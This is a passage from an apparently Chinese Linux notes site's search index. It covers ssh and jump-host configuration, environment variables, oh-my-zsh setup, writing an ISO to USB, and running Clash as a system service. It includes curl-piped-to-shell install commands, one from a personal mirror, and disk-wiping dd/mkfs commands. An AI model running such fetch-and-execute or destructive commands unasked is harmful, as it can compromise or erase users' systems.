<li>c\uff1a\u65ad\u70b9\u7eed\u4f20\uff0c\u5982\u679c\u4e0b\u8f7d\u4e2d\u65ad\uff0c\u90a3\u4e48\u8fde\u63a5\u6062\u590d\u65f6\u4f1a\u4ece\u4e0a\u6b21\u65ad\u70b9\u5f00\u59cb\u4e0b\u8f7d</li> </ul>"},{"location":"tools/linux/command/#tar","title":"tar\uff1a\u89e3\u538b\u7f29","text":"\u53c2\u6570 \u89e3\u91ca z \u901a\u8fc7 gzip \u652f\u6301\u7684\u538b\u7f29\u6216\u89e3\u538b\u7f29\u3002\u8fd8\u6709\u5176\u4ed6\u7684\u538b\u7f29\u6216\u89e3\u538b\u7f29\u65b9\u5f0f\uff0c\u6bd4\u5982 j \u8868\u793a bzip2 \u7684\u65b9\u5f0f x \u89e3\u538b\u7f29 v \u5728\u538b\u7f29\u6216\u89e3\u538b\u7f29\u8fc7\u7a0b\u4e2d\u663e\u793a\u6b63\u5728\u5904\u7406\u7684\u6587\u4ef6\u540d f f \u540e\u9762\u5fc5\u987b\u8ddf\u4e0a\u8981\u5904\u7406\u7684\u6587\u4ef6\u540d"},{"location":"tools/linux/command/#ssh","title":"ssh\uff1a\u8fdc\u7a0b\u8fde\u63a5","text":""},{"location":"tools/linux/command/#_2","title":"\u57fa\u7840\u4f7f\u7528","text":"<pre><code>ssh -p &lt;port&gt; user@ip\n# ssh root@47.108.147.2\n</code></pre>"},{"location":"tools/linux/command/#_3","title":"\u514d\u5bc6\u767b\u5f55","text":"1. \u67e5\u770b\u662f\u5426\u5b58\u5728\u79d8\u94a5\uff0c\u82e5\u5b58\u5728\uff0c\u5219\u8df3\u8fc7\u4e0b\u9762\u7684\u6b65\u9aa4<pre><code>ls -al ~/.ssh\n</code></pre> 2. \u521b\u5efa\u79d8\u94a5\u5bf9\uff0c\u590d\u5236\u516c\u94a5<pre><code>ssh-keygen -t ed25519 -C \"your_email@example.com\"\n# \u6ce8\uff1a\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u4e0d\u652f\u6301 Ed25519 \u7b97\u6cd5\u7684\u65e7\u7cfb\u7edf\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a\nssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n# \u56de\u8f66\u4e09\u6b21\n\ncd ~/.ssh\ncat id_ed25519.pub # \u590d\u5236\n</code></pre> 3. \u767b\u5f55\u8fdc\u7a0b\u4e3b\u673a\uff0c\u5e76\u7c98\u8d34\u516c\u94a5\u81f3 ~/.ssh/authorized_keys<pre><code>ssh ubuntu@101.43.55.140\nvim ~/.ssh/authorized_keys # \u7c98\u8d34\n</code></pre>"},{"location":"tools/linux/command/#_4","title":"\u914d\u7f6e\u8fdc\u7a0b\u4e3b\u673a\u540d\u79f0","text":"<p>\u901a\u8fc7\u914d\u7f6e <code>~/.ssh/config</code> \u6587\u4ef6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u901a\u8fc7\u4e3b\u673a\u540d\u6765\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a\uff0c\u914d\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>Host CustomName\n  HostName 1.2.3.4\n  User HappyTsing\n  Port 22\n</code></pre> <p>\u6b64\u540e\u53ef\u4ee5\u901a\u8fc7 <code>ssh CustomName</code> \u6765\u76f4\u63a5\u8fdb\u884c ssh \u8fde\u63a5\uff0c\u800c\u4e0d\u7528\u8f93\u5165 <code>user@ip</code> \u7684\u5f62\u5f0f\uff0c\u66f4\u52a0\u597d\u7528\u3002</p>"},{"location":"tools/linux/command/#_5","title":"\u8df3\u677f\u673a","text":"<p>ssh \u53ef\u4ee5\u901a\u8fc7 <code>ProxyCommand</code> \u548c <code>ProxyJump</code> \u6765\u5b9e\u73b0\u901a\u8fc7\u8df3\u677f\u673a\u8fdc\u7a0b\u8fde\u63a5\uff0c\u4e8c\u8005\u4e0d\u53ef\u540c\u65f6\u914d\u7f6e\uff0c<code>ProxyCommand</code> \u662f\u66f4\u53e4\u8001\u7684\u534f\u8bae\uff0c\u63a8\u8350\u4f7f\u7528\u66f4\u5b89\u5168\u7684 <code>ProxyJump</code>\u3002</p> <p>\u901a\u8fc7\u914d\u7f6e <code>~/.ssh/config</code> \u6216\u8005 <code>/etc/ssh/ssh_config</code> \u6765\u5b9e\u73b0\u8df3\u677f\u673a\uff0c\u9996\u5148\u4ecb\u7ecd <code>ProxyCommand</code> \u7684\u65b9\u6cd5\uff1a</p> <pre><code>Host jumpbox\nHostName 192.168.1.112\nUser wangleqing\n\nHost target_server\nHostName 192.168.2.157\nUser happytsing\nPort 22\nProxyCommand ssh -W %h:%p jumpbox\n</code></pre> <p><code>%h</code> \u548c <code>%s</code> \u7528\u4e8e\u52a8\u6001\u7684\u83b7\u53d6 <code>HostName</code> \u548c <code>Port</code>\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5199\u6b7b\u3002<code>-W</code> \u662f\u4e3a\u4e86\u5b9e\u73b0 nc \u547d\u4ee4\u5efa\u7acb\u8fde\u63a5\u3002</p> <p>\u66f4\u63a8\u8350\u91c7\u7528 <code>ProxyJump</code> \u7684\u65b9\u5f0f\u8fdb\u884c\u8df3\u8f6c\uff1a</p> <ul> <li><code>ssh -J jumpbox@host:port target@host -p port</code> \u6ce8\u610f\u53ef\u4ee5\u65e0\u9650\u5d4c\u5957</li> <li>\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\uff1a</li> </ul> <pre><code>Host jumpbox\nHostName 192.168.1.112\nUser wangleqing\n\nHost target_server\nHostName 192.168.2.157\nUser happytsing\nPort 22\nProxyJump jumpbox\n</code></pre> <p>\u914d\u7f6e\u5b8c\u6bd5\u540e\uff0c\u901a\u8fc7 <code>ssh target_server</code> \u5373\u53ef\u76f4\u63a5\u901a\u8fc7\u8df3\u677f\u673a\u767b\u5f55\u3002</p> <p>\u6b64\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>-v</code> \u53c2\u6570\u6253\u5370\u8c03\u8bd5\u4fe1\u606f</p>"},{"location":"tools/linux/command/#scp","title":"scp\uff1a\u4e0a\u4f20/\u4e0b\u8f7d\u6587\u4ef6","text":"<pre><code># 1. \u4e0a\u4f20\nscp  /path/filename  username@serverIp:/path\n\n# 2. \u4e0b\u8f7d\nscp ubuntu@101.43.55.140:/path/filename   ~/local_dir\uff08\u672c\u5730\u76ee\u5f55\uff09\n</code></pre>"},{"location":"tools/linux/env/","title":"\u73af\u5883\u53d8\u91cf","text":""},{"location":"tools/linux/env/#1","title":"1. \u8bfb\u53d6\u73af\u5883\u53d8\u91cf","text":"<ul> <li><code>export</code>\uff1a\u663e\u793a\u6240\u6709\u73af\u5883\u53d8\u91cf</li> <li><code>echo $name</code>\uff1a\u8f93\u51fa\u67d0\u4e2a\u5177\u4f53\u73af\u5883\u53d8\u91cf\u7684\u503c\uff0c\u6bd4\u5982<code>echo $PATH</code></li> </ul>"},{"location":"tools/linux/env/#2","title":"2. \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","text":"<p>export name=value</p> <ul> <li>\u751f\u6548\u65f6\u95f4\uff1a\u7acb\u5373\u751f\u6548</li> <li>\u751f\u6548\u671f\u9650\uff1a\u5f53\u524d\u7ec8\u7aef\u6709\u6548\uff0c\u7a97\u53e3\u5173\u95ed\u540e\u65e0\u6548</li> <li>\u751f\u6548\u8303\u56f4\uff1a\u4ec5\u9488\u5bf9\u5f53\u524d\u7528\u6237\u6709\u6548</li> </ul> <p>~/.bashrc</p> <ul> <li>\u751f\u6548\u65f6\u95f4\uff1a\u4ea4\u4e92\u5f0f\u3001non-login \u65b9\u5f0f\u8fdb\u5165 bash \u8fd0\u884c\u65f6\u5c31\u4f1a\u751f\u6548\uff0c\u6216\u8005\u624b\u52a8<code>source ~/.bashrc</code>\u751f\u6548\u3002\u82e5\u662f zsh \uff0c\u4fee\u6539 <code>~/.zshrc</code></li> <li>\u751f\u6548\u671f\u9650\uff1a\u6c38\u4e45\u6709\u6548</li> <li>\u751f\u6548\u8303\u56f4\uff1a\u4ec5\u9488\u5bf9\u5f53\u524d\u7528\u6237\u6709\u6548</li> </ul> <p>~/.bash_profile</p> <ul> <li>\u751f\u6548\u65f6\u95f4\uff1a\u4ea4\u4e92\u5f0f\u3001login \u65b9\u5f0f\u8fdb\u5165 bash \u8fd0\u884c\uff0c\u6267\u884c\u4e00\u6b21\u3002\u6216\u8005\u624b\u52a8 source\u3002\u901a\u5e38<code>~/.bash_profile</code>\u4f1a\u8c03\u7528<code>~/.bashrc</code></li> <li>\u751f\u6548\u671f\u9650\uff1a\u6c38\u4e45\u6709\u6548</li> <li>\u751f\u6548\u8303\u56f4\uff1a\u4ec5\u9488\u5bf9\u5f53\u524d\u7528\u6237\u6709\u6548</li> </ul> <p>~/.profile</p> <ul> <li>\u611f\u89c9\u548c.bash_profile \u7c7b\u4f3c\uff0c\u5982\u679c\u4f7f\u7528 zsh \u7684\u8bdd\uff0c\u4fee\u6539.profile \u5373\u53ef\u3002</li> </ul> <p>/etc/bashrc\u3001/etc/profile</p> <ul> <li>\u751f\u6548\u8303\u56f4\uff1a\u5bf9\u6240\u6709\u7528\u6237\u6709\u6548</li> </ul>"},{"location":"tools/linux/initialize/","title":"Linux \u521d\u59cb\u5316 Shell \u53ca\u63d2\u4ef6","text":"<p>\u98df\u7528\u6307\u5357</p> <p>\u672c\u7b14\u8bb0\u57fa\u4e8e Ubuntu \u64b0\u5199\uff0c\u98df\u7528\u524d\u63a8\u8350\u6362\u6e90\uff1a</p> <ul> <li>\u6e05\u534e\u6e90</li> <li>\u4e2d\u79d1\u5927\u6e90</li> </ul>"},{"location":"tools/linux/initialize/#zsh","title":"zsh","text":"<pre><code>sudo apt-get update\nsudo apt-get upgrade\nsudo apt-get install -y zsh wget curl git autojump\ncat /etc/shells # \u67e5\u770b\u6240\u6709\u5b89\u88c5\u7684shell\nchsh -s $(which zsh) #\u4fee\u6539\u9ed8\u8ba4shell\u4e3azsh   \u6216\u8005\u8f93\u5165chsh\u540e\u56de\u8f66\uff0c\u518d\u8f93\u5165/bin/zsh\necho $SHELL # \u67e5\u770b\u4fee\u6539\u540e\u7684\u4f7f\u7528shell\n</code></pre> <p>Note</p> <p>\u4fee\u6539\u9ed8\u8ba4 shell \u540e\uff0c\u9700\u8981\u91cd\u542f\u673a\u5668\u65b9\u53ef\u751f\u6548\uff01</p>"},{"location":"tools/linux/initialize/#oh-my-zsh","title":"oh-my-zsh","text":""},{"location":"tools/linux/initialize/#plugin","title":"plugin","text":"<p>Note</p> <p>\u63d0\u4f9b\u4e86 Github \u5b98\u65b9\u94fe\u63a5\u548c\u7b14\u8005 fork \u4e0b\u6765\u7684 Gitee \u955c\u50cf\u94fe\u63a5</p> oh-my-zsh\uff1azsh\u7f8e\u5316<pre><code>sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\nsh -c \"$(curl -fsSL https://gitee.com/forkhub-tsing/ohmyzsh/raw/master/tools/install.sh)\"\n</code></pre> zsh-syntax-highlighting\uff1a\u63d0\u4f9b\u547d\u4ee4\u9ad8\u4eae<pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\ngit clone https://gitee.com/forkhub-tsing/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n</code></pre> autosuggestions\uff1a\u8bb0\u4f4f\u4f60\u4e4b\u524d\u4f7f\u7528\u8fc7\u7684\u547d\u4ee4<pre><code>git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\ngit clone https://gitee.com/forkhub-tsing/zsh-autosuggestions.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n</code></pre> \u914d\u7f6e .zshrc \u542f\u52a8\u63d2\u4ef6<pre><code>vim ~/.zshrc\n## \u627e\u5230plugins=(git)\uff0c\u4fee\u6539\u4e3a\uff1a\nplugins=(git autojump zsh-syntax-highlighting zsh-autosuggestions sudo extract)\n# sudo\u662fohmyzsh\u81ea\u5e26\u7684\u63d2\u4ef6\uff0c\u529f\u80fd\u662f\u5728\u4f60\u8f93\u5165\u7684\u547d\u4ee4\u7684\u5f00\u5934\u6dfb\u52a0sudo \uff0c\u65b9\u6cd5\u662f\u53cc\u51fbEsc\n# extract\u4e5f\u662f\u81ea\u5e26\u63d2\u4ef6\uff0c\u4e0d\u7528\u518d\u53bb\u8bb0\u4e0d\u540c\u6587\u4ef6\u7684\u89e3\u538b\u547d\u4ee4\uff0c\u65b9\u6cd5\u662fextract +\u4f60\u8981\u89e3\u538b\u7684\u6587\u4ef6\u540d\n\n# \u7ed1\u5b9a~\u4e3a\u63a5\u53d7\u5efa\u8bae\uff0c\u5728\u6587\u4ef6\u672b\u5c3e\u6dfb\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a\nbindkey '`' autosuggest-accept\n\n# \u4f7f\u7528\u5982\u4e0bshell\u4ee3\u7801\u4e00\u952e\u914d\u7f6e\nsed -i '/plugins=(git)/ c plugins=(git autojump zsh-syntax-highlighting zsh-autosuggestions sudo extract)' ~/.zshrc\nif [ ! `grep -c \"bindkey .* autosuggest-accept\" $HOME/.zshrc` -ne \"0\" ];then\n    sed -i '$a bindkey '\"'\"'`'\"'\"' autosuggest-accept' ~/.zshrc\nfi\n</code></pre>"},{"location":"tools/linux/initialize/#theme","title":"theme","text":"<p>\u63a8\u8350\u4e3b\u9898</p> <ul> <li>powerlevel10k</li> <li>pure</li> </ul>"},{"location":"tools/linux/initialize/#powerlevel10k","title":"Powerlevel10k","text":"<p>\u8bf7\u786e\u4fdd\u5df2\u5b89\u88c5\u5b57\u4f53 MesloLGS NF Regular</p> <pre><code>git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n# vim ~/.zshrc \u627e\u5230ZSH_THEME\uff0c\u4fee\u6539\u4e3a\uff1aZSH_THEME=\"powerlevel10k/powerlevel10k\"\n# \u901a\u8fc7\u547d\u4ee4\u4e00\u952e\u914d\u7f6e\uff1a\nsed -i '/ZSH_THEME=\"/ c ZSH_THEME=\"powerlevel10k/powerlevel10k\"' ~/.zshrc\n</code></pre> <p>\u91cd\u542f shell\uff0c\u82e5\u9009\u62e9\u4e86 p10k \u4e3b\u9898\uff0c\u6b64\u65f6\u4f1a\u8fdb\u5165\u4e3b\u9898\u8bbe\u7f6e\uff0c\u6309\u5f15\u5bfc\u8fdb\u884c\u5373\u53ef\uff0c\u5982\u679c\u8bbe\u7f6e\u540e\u4e0d\u6ee1\u610f\uff1a</p> \u91cd\u65b0\u914d\u7f6e\u4e3b\u9898<pre><code>p10k configure\n</code></pre>"},{"location":"tools/linux/initialize/#pure","title":"Pure","text":"<pre><code>git clone https://gitee.com/forkhub-tsing/pure.git \"$HOME/.zsh/pure\"\n\n# \u53c2\u89c1 https://github.com/sindresorhus/pure#install\n# \u901a\u8fc7\u547d\u4ee4\u4e00\u952e\u914d\u7f6e\uff1a\n\n# \u65b0\u589e\u914d\u7f6e\necho 'fpath+=($HOME/.zsh/pure)' &gt;&gt; ~/.zshrc\necho 'autoload -U promptinit; promptinit' &gt;&gt; ~/.zshrc\necho 'prompt pure' &gt;&gt; ~/.zshrc\n</code></pre> \u5220\u9664\u4e3b\u9898\u914d\u7f6e<pre><code># \u5220\u9664p10k\u53capure\u7684\u65e7\u914d\u7f6e\nsed -i '/fpath.*pure/d' ~/.zshrc\nsed -i '/autoload.*promptinit/d' ~/.zshrc\nsed -i '/prompt pure/d' ~/.zshrc\n\n# Set ZSH_THEME=\"\" in your .zshrc to disable oh-my-zsh themes.\nsed -i '/ZSH_THEME=\"/ c ZSH_THEME=\"\"' ~/.zshrc\n</code></pre>"},{"location":"tools/linux/initialize/#other-plugin","title":"other plugin","text":"<ul> <li> <p>bat\uff0c\u66f4\u597d\u7528\u7684 cat</p> </li> <li> <p>tig\uff0c\u66f4\u597d\u7528\u7684 gitlog</p> </li> <li> <p>thefuck</p> </li> <li> <p>htop, \u66f4\u597d\u7528\u7684 top</p> </li> <li> <p>ydict\uff0c\u7ffb\u8bd1</p> </li> </ul>"},{"location":"tools/linux/initialize/#shortcuts","title":"shortcuts","text":"<ul> <li> <p>bat \u4ee3\u66ff cat\uff0c\u53ef\u4ee5\u9ad8\u4eae\u663e\u793a\u4ee3\u7801</p> </li> <li> <p>j \u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u5feb\u901f\u8df3\u8f6c\u5230\u67d0\u4e2a\u76ee\u5f55\uff0c\u800c\u4e0d\u9700\u8981\u8f93\u5165\u8fd9\u4e2a\u76ee\u5f55\u7684\u524d\u5e8f\u76ee\u5f55</p> </li> <li>d\uff0c\u53ef\u4ee5\u67e5\u770b\u5df2\u7ecf\u53bb\u8fc7\u7684\u76ee\u5f55\uff0c\u7136\u540e\u8f93\u5165\u5bf9\u5e94\u6570\u5b57\u8fdb\u5165\u5bf9\u5e94\u76ee\u5f55</li> <li>\u51fa\u73b0\u63d0\u793a\u65f6\uff0c\u8f93\u5165~\u6216\u8005\u65b9\u5411\u53f3\u952e\u5e94\u7528\u63d0\u793a</li> <li>\u5220\u9664 shell \u4e2d\u7684\u4e00\u884c\u5185\u5bb9\u3002\u9996\u5148 ctrl+a \u79fb\u52a8\u5230\u884c\u9996\uff0c\u518d ctrl+k \u5220\u9664\u4e00\u884c\u7684\u5185\u5bb9</li> <li>r\uff0c\u91cd\u590d\u4e0a\u4e00\u6761\u547d\u4ee4</li> <li>code filename \u547d\u4ee4\uff0c\u4f7f\u7528 vscode \u6253\u5f00\u67d0\u6587\u4ef6</li> <li>.zshrc \u4e2d\u914d\u7f6e\u4e86 plugins=(sudo)\u540e\uff0c\u8fde\u7eed\u6309\u4e24\u4e0b esc \u952e\u5373\u5728\u547d\u4ee4\u524d\u52a0\u4e0a sudo</li> <li>fuck\uff0c\u5b89\u88c5\u4e86 thefuck \u540e\u8f93\u5165\u5373\u53ef\u7ea0\u6b63\u9519\u8bef</li> </ul>"},{"location":"tools/linux/initialize/#reference","title":"Reference","text":"<ul> <li>Github powerlevel10k</li> <li>iterm2 \u548c zsh \u7ec8\u7aef\u4f53\u9a8c\u4f18\u5316</li> <li>\u7a0b\u5e8f\u5458\u5185\u529f\u7cfb\u5217-iTerm2 \u4e0e Zsh \u7bc7</li> <li>\u7a0b\u5e8f\u5458\u5185\u529f\u7cfb\u5217-\u5e38\u7528\u547d\u4ee4\u884c\u5de5\u5177\u63a8\u8350</li> <li>oh my zsh \u63d2\u4ef6\u63a8\u8350</li> </ul>"},{"location":"tools/linux/iso/","title":"\u70e7\u5f55 ISO","text":""},{"location":"tools/linux/iso/#1-iso","title":"1. \u4e0b\u8f7d iso\uff08\u4e2d\u79d1\u5927\u6e90\uff09","text":""},{"location":"tools/linux/iso/#2-u","title":"2. \u683c\u5f0f\u5316 u \u76d8","text":"<pre><code># \u67e5\u770b\u6302\u8f7d\u7684u\u76d8\uff0c\u4e00\u822c\u662f /dev/sdd1\u3001/dev/sdb\ndf -h\nsudo fdisk -l  # \u66f4\u8be6\u7ec6\n\n# \u683c\u5f0f\u5316\u4e4b\u524d\uff0c\u5148\u5378\u8f7du\u76d8\numount /dev/sdd1\n\n# \u683c\u5f0f\u5316\uff0c\u4e09\u79cd\u683c\u5f0f\uff0c\u9009\u62e9\u5176\u4e2d\u4e00\u79cd\uff08\u4e00\u822c\u7b2c\u4e09\u79cd\uff09\nsudo mkfs.ntfs /dev/sdd1\nsudo mkfs.ext4 /dev/sdd1\nsudo mkfs.vfat /dev/sdd1\n</code></pre>"},{"location":"tools/linux/iso/#3","title":"3. \u5236\u4f5c\u542f\u52a8\u6587\u4ef6","text":"<pre><code>sudo dd if=/path/to/ubuntu.isoi of=/dev/sdd bs=4M status=progress &amp;&amp; sync\n</code></pre> <ul> <li>bs=4M \u8bbe\u7f6e\u4e00\u6b21\u8bfb\u5199 BYTES \u5b57\u8282,status=progress \u663e\u793a\u70e7\u5f55\u8fdb\u5ea6</li> <li>\u6ce8\u610f\uff0cof=/dev/sdd\uff0c\u800c\u4e0d\u9700\u8981\u52a0\u4e0a\u5206\u533a\u53f7\uff08sdd1\uff09</li> <li>sync \u7528\u4e8e\u5c06\u7f13\u5b58\u540c\u6b65\u5230 u \u76d8\u4e2d</li> </ul>"},{"location":"tools/linux/iso/#4","title":"4. \u6587\u4ef6\u5206\u533a","text":"\u76ee\u5f55 \u5efa\u8bae\u5927\u5c0f \u683c\u5f0f \u63cf\u8ff0 /boot 1G \u5de6\u53f3 ext4 \u7a7a\u95f4\u8d77\u59cb\u4f4d\u7f6e \u00a0 \u5206\u533a\u683c\u5f0f\u4e3a ext4\u00a0/boot \u5efa\u8bae\uff1a\u5e94\u8be5\u5927\u4e8e 400MB \u6216 1GB\u00a0Linux \u7684\u5185\u6838\u53ca\u5f15\u5bfc\u7cfb\u7edf\u7a0b\u5e8f\u6240\u9700\u8981\u7684\u6587\u4ef6\u3002 swap \u7269\u7406\u5185\u5b58\u4e24\u500d\uff0c\u5185\u5b58\u5927\u7684\u8bdd\uff0c\u548c\u7269\u7406\u5185\u5b58\u4e00\u6837\u5927\u5373\u53ef swap \u4ea4\u6362\u7a7a\u95f4\uff1a\u4ea4\u6362\u5206\u533a\u76f8\u5f53\u4e8e Windows \u4e2d\u7684\u201c\u865a\u62df\u5185\u5b58\u201d\u3002 / 150G-200G ext4/xfs \u6839\u76ee\u5f55 /tmp 5G \u5de6\u53f3 ext4 \u7cfb\u7edf\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u4e00\u822c\u7cfb\u7edf\u91cd\u542f\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u3002\uff08\u5efa\u7acb\u670d\u52a1\u5668\u9700\u8981\uff0c\u5bb6\u5ead\u7528\u4e5f\u53ef\u4e0d\u6302\u8f7d) /home \u5269\u4f59\u6240\u6709 ext4/xfs \u7528\u6237\u5de5\u4f5c\u76ee\u5f55\uff1b\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\uff0c\u5982\u4e2a\u4eba\u73af\u5883\u53d8\u91cf\u7b49\uff1b\u6240\u6709\u8d26\u53f7\u5206\u914d\u4e00\u4e2a\u5de5\u4f5c\u76ee\u5f55\u3002"},{"location":"tools/linux/over-wall/","title":"\u79d1\u5b66\u4e0a\u7f51","text":"<p>Note</p> <p>\u672c\u7b14\u8bb0\u7528\u4e8e\u65e0\u56fe\u5f62\u5316\u754c\u9762\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7 Clash \u5b9e\u73b0\u79d1\u5b66\u4e0a\u7f51</p> <p>1. \u67e5\u770b\u662f\u5426\u5df2\u7ecf\u7ffb\u5899</p> <pre><code>curl -v https://www.google.com\n</code></pre> <p>2. \u4e0b\u8f7d\u5b89\u88c5 Clash</p> <pre><code>cd ~ &amp;&amp; mkdir clash &amp;&amp; cd clash\nwget https://github.com/Dreamacro/clash/releases/download/v1.8.0/clash-linux-amd64-v1.8.0.gz\ngzip -d clash-linux-amd64-v1.8.0.gz\nmv clash-linux-amd64-v1.8.0 clash  # \u91cd\u547d\u540d\u4e3aclash\nchmod +x clash\n</code></pre> <p>3. \u914d\u7f6e <code>config.yaml</code></p> <pre><code>cd ~/clash\nvim config.yaml # \u914d\u7f6e\u6587\u4ef6\u8bf7\u81ea\u884c\u83b7\u53d6\n</code></pre> <p>\u6b64\u65f6 <code>~/clash</code> \u6587\u4ef6\u5939\u4e0b\u6709\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>\u53ef\u6267\u884c\u6587\u4ef6\uff1aclash</li> <li>\u914d\u7f6e\u6587\u4ef6\uff1aconfig.yaml</li> </ul> <p>4. \u8fd0\u884c clash\uff1a\u4f7f\u7528 <code>-d</code> \u6307\u5b9a\u914d\u7f6e\u6240\u5728\u7684\u6587\u4ef6\u5939\uff0c\u672c\u6b21\u6307\u5b9a\u4e3a\u5f53\u524d\u6587\u4ef6\u5939 <code>~/clash</code></p> <pre><code>cd ~/clash &amp;&amp; ./clash -d .\n</code></pre> <p>\u6b64\u65f6\u4f1a\u591a\u51fa\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>\u7f13\u5b58\u6587\u4ef6\uff1acache.db</li> <li>Country.mmdb</li> </ul> <p>\u82e5\u5b58\u5728\u7f51\u7edc\u95ee\u9898\uff0c\u53ef\u76f4\u63a5\u4e0b\u8f7d Country.mmdb</p> <pre><code>wget -O Country.mmdb https://cdn.jsdelivr.net/gh/Dreamacro/maxmind-geoip@release/Country.mmdb\n</code></pre> <p>5. \u542f\u52a8\u547d\u4ee4\u884c\u4ee3\u7406</p> <pre><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n</code></pre> <p>Note</p> <p>\u901a\u8fc7\u5728\u7ec8\u7aef\u8fd0\u884c\u4e0a\u8ff0\u547d\u4ee4\uff0c\u53ef\u4e34\u65f6\u4fee\u6539\uff0c\u91cd\u542f\u7ec8\u7aef\u5373\u5931\u6548</p> <p>\u5982\u679c\u9700\u8981\u6c38\u4e45\u4fee\u6539\uff0c\u53ef\u5c06\u5176\u5199\u5165\u914d\u7f6e\u6587\u4ef6<code>~/.zshrc</code>\u4e2d\uff0c\u4f46\u4e0d\u63a8\u8350\u3002</p> <p>\u6b64\u65f6\uff0c\u5df2\u7ecf\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f46\u4e3a\u4e86\u7cbe\u76ca\u6c42\u7cbe\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> <li>\u5982\u4f55\u5f00\u673a\u9ed8\u8ba4\u542f\u52a8\uff1f</li> <li>\u5982\u4f55\u5207\u6362\u4ee3\u7406\uff1f\u9ed8\u8ba4\u4f7f\u7528\u7684\u662f <code>config.yaml \u2192 first of proxies</code></li> </ul> <p>6. \u5f00\u673a\u9ed8\u8ba4\u542f\u52a8\uff1aclash as a daemon</p> <p>\u79fb\u52a8\u6587\u4ef6 <code>~/clash</code> \u4e2d\u7684\u6587\u4ef6\u5230\u6307\u5b9a\u4f4d\u7f6e\uff1a</p> <pre><code>cd ~/clash\nsudo mkdir /etc/clash/\nsudo cp clash /usr/local/bin\nsudo cp config.yaml /etc/clash/\nsudo cp Country.mmdb /etc/clash/\n\n# \u6e05\u7406\u65e0\u7528\u6587\u4ef6\nrm -rf ~/clash\n</code></pre> <p>Create the systemd configuration file at\u00a0<code>/etc/systemd/system/clash.service</code>\uff1a</p> <pre><code>sudo vim /etc/systemd/system/clash.service\n[Unit]\nDescription=Clash daemon, A rule-based proxy in Go.\nAfter=network.target\n\n[Service]\nType=simple\nRestart=always\nExecStart=/usr/local/bin/clash -d /etc/clash\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>\u8bbe\u7f6e\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u542f\u52a8 clash\uff1a</p> <pre><code>sudo systemctl enable clash\n</code></pre> <p>\u7acb\u5373\u542f\u52a8\u3001\u91cd\u542f clash\uff1a</p> <pre><code>sudo systemctl start clash\nsudo systemctl restart clash\n</code></pre> <p>\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5 Clash \u7684\u8fd0\u884c\u72b6\u6001\u548c\u65e5\u5fd7\uff1a</p> <pre><code>systemctl status clash\njournalctl -xe\n</code></pre> <p>7. \u5207\u6362\u4ee3\u7406\uff1aRESTful API</p> <p>\u7f51\u9875\uff1ahttp://clash.razord.top/#/proxies</p> <p>\u9996\u5148\uff0c\u68c0\u67e5\u5e76\u7f16\u8f91 <code>/etc/clash/config.yaml</code></p> <pre><code># \u76d1\u542c\u5728 127.0.0.1 \u7684 9090 \u7aef\u53e3\nexternal-controller = 127.0.0.1:9090\n\n# \u4f60\u53ef\u4ee5\u52a0\u5165 secret \u8fdb\u884c API \u9274\u6743\nsecret = 081008\n# \u9274\u6743\u7684\u65b9\u5f0f\u4e3a\u5728 Http Header \u4e2d\u52a0\u5165 Authorization: Bearer ${secret}\ncurl -H \"Authorization: Bearer 081008\"\n\n# \u5982\u6709\u4fee\u6539\uff0c\u91cd\u542f\uff1a\nsystemctl restart clash\n</code></pre> <p>Warning</p> <p>\u6b64\u5904\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u6211\u4eec\u4e0d\u8bbe\u7f6e secret\uff0c\u4f46\u5982\u679c\u60f3\u8981\u4fdd\u8bc1\u5b89\u5168\u6027\uff0c\u8fd8\u662f\u63a8\u8350\u8bbe\u7f6e\u4e00\u4e0b\u3002</p> <p>\u5982\u4e0b <code>/etc/clash/config.yaml</code>\u4e2d\u7684\u90e8\u5206\u8bbe\u7f6e\u6240\u793a\uff0c Proxy \u4e2d\u8bb0\u5f55\u4e86\u53ef\u9009\u62e9\u7684\u670d\u52a1\u5668\u5217\u8868\uff1a</p> <pre><code>- name: Proxy\n  type: select\n  proxies:\n    - \"\u53f0\u6e7eTW\"\n    - \"\u65b0\u52a0\u5761SG\"\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7 API \u77e5\u9053 Proxy 